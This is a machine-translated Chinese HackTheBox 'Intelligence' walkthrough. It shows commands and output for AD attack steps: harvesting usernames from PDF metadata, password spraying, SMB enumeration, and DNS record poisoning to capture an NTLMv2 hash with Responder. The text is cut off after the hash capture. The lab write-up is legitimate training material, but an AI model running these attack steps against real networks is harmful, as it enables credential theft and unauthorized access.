<html>
<head>
<title>Intelligence from HackTheBox</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的情报</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/intelligence-from-hackthebox-5315c1b89ebf?source=collection_archive---------1-----------------------#2021-11-24">https://infosecwriteups.com/intelligence-from-hackthebox-5315c1b89ebf?source=collection_archive---------1-----------------------#2021-11-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c2be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术的详细演练。</p><h1 id="55de" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/baa019fd9f7eb0f1bea96f7ba42fcdf7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*wsF-4kzGxTo27zmy.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子智能</figcaption></figure><p id="3ba4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">智能是HackTheBox上的一台中型机器。这是一个托管DC和许多其他服务的Windows盒子。我们的起点是一个网站，通过一些蛮力，我们找到了许多pdf。隐藏在其中的是我们用来访问SMB共享的凭据。从那里我们找到一个脚本，它将我们指向一个预定的任务，我们通过将DNS指向我们的攻击机器来利用这个任务。使用Responder我们获取用户的哈希，这很容易被破解。使用这些凭证，我们获取一个服务帐户散列，并据此创建一个服务票来模拟管理员。这听起来很简单，但是这个花费了我太多的时间！</p><p id="bd73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">需要的技能是web和OS枚举，以及对针对Active Directory的基本攻击方法的理解。学到的技能很多，包括使用CrackMapExec、SMBMap、LDAP搜索、Responder、Impacket脚本和Kerberos票证创建。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/357" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">侵入测试实验室</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="a2bb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="c73d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/de5a9ea5a7587b84830905a49dd28ad1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ntPR6smUAZDPmOIlZzybMA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap扫描输出</figcaption></figure><p id="9088" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到机器名称，所以让我们添加它:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="cd91" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# echo "10.10.10.248 intelligence.htb" &gt;&gt; /etc/hosts</span></pre><p id="5b6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，这是一个Windows盒子，是一个DC，同时运行许多其他服务。我们先来看看80端口的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nh"><img src="../Images/9145ec14e79c34635961364c45ca0f7c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2qZ2MCrhhUQMWudw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子情报网站</figcaption></figure><p id="35db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">网站上的内容不多，但我们确实找到了两个文档的链接。让我们抓住他们:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d9b0" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# wget http://intelligence.htb/documents/2020-12-15-upload.pdf<br/>--2021-10-05 22:03:38--  <a class="ae ni" href="http://intelligence.htb/documents/2020-12-15-upload.pdf" rel="noopener ugc nofollow" target="_blank">http://intelligence.htb/documents/2020-12-15-upload.pdf</a></span><span id="acc5" class="nc km iq my b gy nj ne l nf ng">Resolving intelligence.htb (intelligence.htb)... 10.10.10.248<br/>Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 27242 (27K) [application/pdf]<br/>Saving to: ‘2020-12-15-upload.pdf’<br/>2020-12-15-upload.pdf        100%[================&gt;]  26.60K  --.-KB/s    in 0.05s<br/>2021-10-05 22:03:38 (541 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# wget http://intelligence.htb/documents/2020-01-01-upload.pdf<br/>--2021-10-05 22:04:16--  <a class="ae ni" href="http://intelligence.htb/documents/2020-01-01-upload.pdf" rel="noopener ugc nofollow" target="_blank">http://intelligence.htb/documents/2020-01-01-upload.pdf</a></span><span id="65ad" class="nc km iq my b gy nj ne l nf ng">Resolving intelligence.htb (intelligence.htb)... 10.10.10.248<br/>Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 26835 (26K) [application/pdf]<br/>Saving to: ‘2020-01-01-upload.pdf’<br/>2020-01-01-upload.pdf        100%[=================&gt;]  26.21K  --.-KB/s    in 0.03s<br/>2021-10-05 22:04:16 (1.02 MB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]</span></pre><h1 id="ea14" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">EXIF数据提取</h1><p id="683e" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这些pdf里面没有什么有趣的东西，只有lorem ipsum filler。让我们看看EXIF的数据，如果需要，首先安装该工具:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/75130f2ff943999c74bf4065825a7e97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nqbdvjvF4_2CyrkDl0Ytag.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Exif工具下载</figcaption></figure><p id="84e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看看使用它的文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f553" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# exiftool 2020-01-01-upload.pdf</span><span id="3e47" class="nc km iq my b gy nj ne l nf ng">ExifTool Version Number         : 12.31<br/>File Name                       : 2020-01-01-upload.pdf<br/>Directory                       : .<br/>File Size                       : 26 KiB<br/>File Modification Date/Time     : 2021:04:01 18:00:00+01:00<br/>File Access Date/Time           : 2021:10:05 22:04:16+01:00<br/>File Inode Change Date/Time     : 2021:10:05 22:04:16+01:00<br/>File Permissions                : -rw-r--r--<br/>File Type                       : PDF<br/>File Type Extension             : pdf<br/>MIME Type                       : application/pdf<br/>PDF Version                     : 1.5<br/>Linearized                      : No<br/>Page Count                      : 1<br/>Creator                         : William.Lee<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# exiftool 2020-12-15-upload.pdf </span><span id="da98" class="nc km iq my b gy nj ne l nf ng">ExifTool Version Number         : 12.31<br/>File Name                       : 2020-12-15-upload.pdf<br/>Directory                       : .<br/>File Size                       : 27 KiB<br/>File Modification Date/Time     : 2021:04:01 18:00:00+01:00<br/>File Access Date/Time           : 2021:10:05 22:03:38+01:00<br/>File Inode Change Date/Time     : 2021:10:05 22:03:38+01:00<br/>File Permissions                : -rw-r--r--<br/>File Type                       : PDF<br/>File Type Extension             : pdf<br/>MIME Type                       : application/pdf<br/>PDF Version                     : 1.5<br/>Linearized                      : No<br/>Page Count                      : 1<br/>Creator                         : Jose.Williams</span></pre><h1 id="a387" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">正在生成单词表</h1><p id="50a3" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们有两个以日期命名的文件，一个在2020年初，另一个在年底。我们也有看起来像两个用户名，威廉。下一个合乎逻辑的步骤是看看我们是否能强力找到其他文件。命名格式很容易创建一个列表，我搜索并找到了<a class="ae ni" href="https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-50.php" rel="noopener ugc nofollow" target="_blank">这个我稍微修改过的</a> Python脚本:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7ebb" class="nc km iq my b gy nd ne l nf ng">from datetime import timedelta, date<br/><br/>def daterange(date1, date2):<br/>    for n in range(int ((date2 - date1).days)+1):<br/>        yield date1 + timedelta(n)<br/><br/>start_dt = date(2020, 1, 1)<br/>end_dt = date(2020, 12, 31)<br/>for dt in daterange(start_dt, end_dt):<br/>    print(dt.strftime("%Y-%m-%d-upload.pdf"))</span></pre><p id="85da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这为我创建了一个潜在文件名列表，2020年的每一天都有一个。我可以将它们保存到一个名为dates.txt的文件中，并与feroxbuster一起使用:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/8145b9d7ce6567cddc32f9bb52b4b0e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JOSNEtFJ9RV66WjnEvkTQw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Ferroxbuster文档扫描</figcaption></figure><p id="ec4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找到了81份文件。该列表输出到名为results.txt的文件中:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/0ba3bd0ba5939a5c0b342090e912bb09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y7tf8ndwjNpyOy5HjBodSQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">找到文件的结果</figcaption></figure><p id="326c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用awk来解决这个问题:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1ee1" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cat results.txt | awk '{ print $5 }'<br/> <br/>http://intelligence.htb/documents/2020-01-20-upload.pdf<br/>http://intelligence.htb/documents/2020-01-23-upload.pdf<br/>http://intelligence.htb/documents/2020-02-17-upload.pdf<br/>http://intelligence.htb/documents/2020-01-01-upload.pdf<br/>http://intelligence.htb/documents/2020-01-02-upload.pdf<br/>http://intelligence.htb/documents/2020-02-28-upload.pdf</span></pre><h1 id="6e00" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">批量文件下载</h1><p id="1251" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">看起来好多了，现在我们可以通过管道把它传给wget来下载所有的文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f813" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cat results.txt | awk '{ print $5 }' | xargs wget<br/>--2021-10-05 22:45:24--  <a class="ae ni" href="http://intelligence.htb/documents/2020-01-20-upload.pdf" rel="noopener ugc nofollow" target="_blank">http://intelligence.htb/documents/2020-01-20-upload.pdf</a></span><span id="ee55" class="nc km iq my b gy nj ne l nf ng">Resolving intelligence.htb (intelligence.htb)... 10.10.10.248<br/>Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 11632 (11K) [application/pdf]<br/>Saving to: ‘2020-01-20-upload.pdf’<br/>2020-01-20-upload.pdf      100%[=================&gt;]  11.36K  --.-KB/s    in 0.004s<br/>2021-10-05 22:45:24 (2.71 MB/s) - ‘2020-01-20-upload.pdf’ saved [11632/11632]<br/><br/>--2021-10-05 22:45:24--  http://intelligence.htb/documents/2020-01-23-upload.pdf<br/>Reusing existing connection to intelligence.htb:80.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 11557 (11K) [application/pdf]<br/>Saving to: ‘2020-01-23-upload.pdf’<br/>2020-01-23-upload.pdf      100%[=================&gt;]  11.29K  --.-KB/s    in 0.001s<br/>2021-10-05 22:45:24 (8.10 MB/s) - ‘2020-01-23-upload.pdf’ saved [11557/11557]<br/>&lt;SNIP&gt;</span></pre><p id="6a4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有所有的文件，但是太多了，无法手动查看。在之前的exiftool中，我们看到Creator字段中有一个用户名，让我们来看看使用字符串下载的文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="605c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# strings *.pdf | grep Creator <br/>                                                                                          <br/>/Creator (TeX)<br/>/Creator (William.Lee)<br/>/Creator (TeX)<br/>/Creator (Scott.Scott)<br/>/Creator (TeX)<br/>&lt;SNIP&gt;</span></pre><p id="9fed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以用字符串提取，让我们创建一个唯一用户名的列表并传递给一个文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d253" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# strings *.pdf | grep Creator | grep -v TeX | awk '{print $2}' | cut -d '(' -f 2 | cut -d ')' -f 1 | sort | uniq</span><span id="8398" class="nc km iq my b gy nj ne l nf ng">Anita.Roberts<br/>Brian.Baker<br/>Brian.Morris<br/>Daniel.Shelton<br/>&lt;SNIP&gt;<br/>Tiffany.Molina<br/>Travis.Evans<br/>Veronica.Patel<br/>William.Lee<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# strings *.pdf | grep Creator | grep -v TeX | awk '{print $2}' | cut -d '(' -f 2 | cut -d ')' -f 1 | sort | uniq &gt; users.txt</span></pre><h1 id="f816" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">数据析取</h1><p id="a06f" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">接下来，我们要搜索所有这些PDF文件的内容，以节省时间。我找到了<a class="ae ni" href="https://www.linuxuprising.com/2019/05/how-to-convert-pdf-to-text-on-linux-gui.html" rel="noopener ugc nofollow" target="_blank">这个</a>转换器，安装好之后，让我们把所有的PDF文件转换成文本文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e140" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# for file in *.pdf; do pdftotext -layout "$file"; done</span></pre><p id="6e70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们为每个PDF文档都准备了一个文本文件，我们可以一次搜索所有文档，查找一些明显的信息，如密码:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d24e" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# grep -rl "password" *.txt</span><span id="4ab2" class="nc km iq my b gy nj ne l nf ng">2020-06-04-upload.txt<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cat 2020-06-04-upload.txt</span><span id="9f9e" class="nc km iq my b gy nj ne l nf ng">New Account Guide<br/>Welcome to Intelligence Corp!<br/>Please login using your username and the default password of:<br/>&lt;HIDDEN&gt;<br/>After logging in please change your password as soon as possible.</span></pre><p id="6af4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有所发现并不奇怪！</p><h1 id="3f0b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">CrackMapExec</h1><p id="3376" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在我们有了一个用户名列表和一个可能的密码。让我们用crackmapexec来做一个密码喷:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/1c678f53c2fc0ee0fd4d769a012f26b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TdVWOpceo1cUzztBMMo75A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">CrackMapExec输出</figcaption></figure><h1 id="c2e1" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SMBMap</h1><p id="f6ea" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们发现蒂芙尼忘记更改密码了！我们可以使用smbmap来枚举SMB共享:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0864" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# smbmap -u Tiffany.Molina -p &lt;HIDDEN&gt; -H intelligence.htb</span><span id="ae5c" class="nc km iq my b gy nj ne l nf ng">[+] IP: intelligence.htb:445    Name: unknown                                           <br/>        Disk                      Permissions     Comment<br/>        ----                      -----------     -------<br/>        ADMIN$                    NO ACCESS       Remote Admin<br/>        C$                        NO ACCESS       Default share<br/>        IPC$                      READ ONLY       Remote IPC<br/>        IT                        READ ONLY<br/>        NETLOGON                  READ ONLY       Logon server share <br/>        SYSVOL                    READ ONLY       Logon server share <br/>        Users                     READ ONLY</span></pre><p id="915c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们对用户有读取权限，有一个叫它。我们可以让smbmap列出我们可以访问的所有内容，而不是手动查看这些共享:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b20d" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# smbmap -u Tiffany.Molina -p &lt;HIDDEN&gt; -H intelligence.htb -R</span><span id="f1b3" class="nc km iq my b gy nj ne l nf ng">[+] IP: intelligence.htb:445    Name: unknown<br/>        Disk                      Permissions      Comment<br/>        ----                      -----------      -------<br/>        ADMIN$                    NO ACCESS        Remote Admin<br/>        C$                        NO ACCESS        Default share<br/>        IPC$                      READ ONLY        Remote IPC<br/>        &lt;SNIP&gt;<br/>        IT                        READ ONLY<br/>        .\IT\*<br/>        fr--r--r-- 1046 Mon Apr 19 01:50:58 2021   downdetector.ps1<br/>        &lt;SNIP&gt;<br/>        Users                     READ ONLY<br/>        .\Users\*<br/>        dr--r--r--   0 Mon Apr 19 01:18:39 2021    Administrator<br/>        dr--r--r--   0 Mon Apr 19 04:16:30 2021    All Users<br/>        dw--w--w--   0 Mon Apr 19 03:17:40 2021    Default<br/>        dr--r--r--   0 Mon Apr 19 04:16:30 2021    Default User<br/>        fr--r--r-- 174 Mon Apr 19 04:15:17 2021    desktop.ini<br/>        dw--w--w--   0 Mon Apr 19 01:18:39 2021    Public<br/>        dr--r--r--   0 Mon Apr 19 02:20:26 2021    Ted.Graves<br/>        dr--r--r--   0 Mon Apr 19 01:51:46 2021    Tiffany.Molina<br/>        &lt;SNIP&gt;<br/>        .\Users\Tiffany.Molina\Desktop\*<br/>        fw--w--w--  34 Thu Oct  7 12:55:49 2021    user.txt</span></pre><p id="6b75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">超过260个文件被返回，所以我们节省了大量时间转储列表，而不是手动查找。我去掉了大部分，留下了三个有趣的东西:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2e96" class="nc km iq my b gy nd ne l nf ng">IT Share has a PowerShell script called downdetector.ps1<br/>User folder has another user called Ted.Graves<br/>User flag is on Tiffany's desktop</span></pre><h1 id="674a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="6e21" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">在查看PowerShell脚本之前，让我们先获取标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="897f" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# smbclient //intelligence.htb/Users -U 'Tiffany.Molina'Enter WORKGROUP\Tiffany.Molina's password: <br/>Try "help" to get a list of possible commands.<br/>smb: \&gt; cd Tiffany.Molina\Desktop\<br/>smb: \Tiffany.Molina\Desktop\&gt; get user.txt<br/>getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cat user.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="5004" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">PowerShell战利品</h1><p id="c94e" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在让我们看看PowerShell脚本:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5da8" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# smbclient  //intelligence.htb/IT -U 'Tiffany.Molina'<br/>Enter WORKGROUP\Tiffany.Molina's password: <br/>Try "help" to get a list of possible commands.<br/>smb: \&gt; get downdetector.ps1<br/>getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (9.0 KiloBytes/sec) (average 9.0 KiloBytes/sec)</span><span id="fd53" class="nc km iq my b gy nj ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cat downdetector.ps1</span><span id="c340" class="nc km iq my b gy nj ne l nf ng"># Check web server status. Scheduled to run every 5min<br/>Import-Module ActiveDirectory<br/>foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {<br/>try {<br/>$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials<br/>if(.StatusCode -ne 200) {<br/>Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject "Host: $($record.Name) is down"<br/>}<br/>} catch {}<br/>}</span></pre><p id="4813" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个简单的脚本，其中有一个循环来从AD中检索所有名称类似web*的记录。然后，它使用带有名称列表的Invoke-WebRequest并尝试进行身份验证。因此，我们知道需要添加一个指向我们的DNS记录，然后我们可以捕获该身份验证请求。</p><h1 id="5057" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">DNS中毒</h1><p id="79cd" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">首先，我们可以使用Dirk Janm的<a class="ae ni" href="https://github.com/dirkjanm/krbrelayx" rel="noopener ugc nofollow" target="_blank"> krbrelayx </a>工具包来添加我们的记录:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3898" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# git clone <a class="ae ni" href="https://github.com/dirkjanm/krbrelayx.git" rel="noopener ugc nofollow" target="_blank">https://github.com/dirkjanm/krbrelayx.git</a></span><span id="7120" class="nc km iq my b gy nj ne l nf ng">Cloning into 'krbrelayx'...<br/>remote: Enumerating objects: 98, done.<br/>remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98<br/>Receiving objects: 100% (98/98), 65.76 KiB | 1.11 MiB/s, done.<br/>Resolving deltas: 100% (48/48), done.<br/><br/>┌──(root💀kali)-[~/htb/intelligence]<br/>└─# cd krbrelayx<br/><br/>┌──(root💀kali)-[~/htb/intelligence/krbrelayx]<br/>└─# python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p '&lt;HIDDEN&gt;' -a add -r 'webpencer.intelligence.htb' -d 10.10.14.251 10.10.10.248</span><span id="e351" class="nc km iq my b gy nj ne l nf ng">[-] Connecting to host...<br/>[-] Binding to host<br/>[+] Bind OK<br/>/root/htb/intelligence/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead<br/>  res = dnsresolver.query(zone, 'SOA')<br/>[-] Adding new record<br/>[+] LDAP operation completed successfully</span></pre><p id="1ffe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上面我们已经使用dnstool脚本添加了一个名为webpencer的记录，我们将该条目指向我们的Kali IP 10 . 10 . 14 . 251。</p><h1 id="3343" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">回答者</h1><p id="ff36" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在，我们启动responder，等待五分钟时间，让脚本联系我们并尝试进行身份验证:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="60a2" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/intelligence]<br/>└─# responder -I tun0 -A<br/>                                         __<br/>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br/>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br/>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br/>                   |__|<br/>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br/>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br/>  To kill this script hit CTRL-C<br/><br/>[+] Poisoners:<br/>    &lt;SNIP&gt;<br/>[+] Servers:<br/>    &lt;SNIP&gt;<br/>[+] HTTP Options:<br/>    &lt;SNIP&gt;<br/>[+] Poisoning Options:<br/>    Analyze Mode               [ON]<br/>    &lt;SNIP&gt;<br/>[+] Generic Options:<br/>    Responder NIC              [tun0]<br/>    Responder IP               [10.10.14.251]<br/>    Challenge set              [random]<br/>    Don't Respond To Names     ['ISATAP']<br/>[+] Current Session Variables:<br/>    Responder Machine Name     [WIN-ZQMKCOX922L]<br/>    Responder Domain Name      [45TT.LOCAL]<br/>    Responder DCE-RPC Port     [49138]<br/><br/>[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.<br/><br/>[+] Listening for events...                          <br/>[HTTP] NTLMv2 Client   : 10.10.10.248<br/>[HTTP] NTLMv2 Username : intelligence\Ted.Graves<br/>[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:98592689b95ecf6e:435A2306687E740FF0DDFA17CAF82E4B&lt;SNIP&gt;9003E0048005400540050002F00770065006200700065006E006300650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span></pre><h1 id="29d0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li 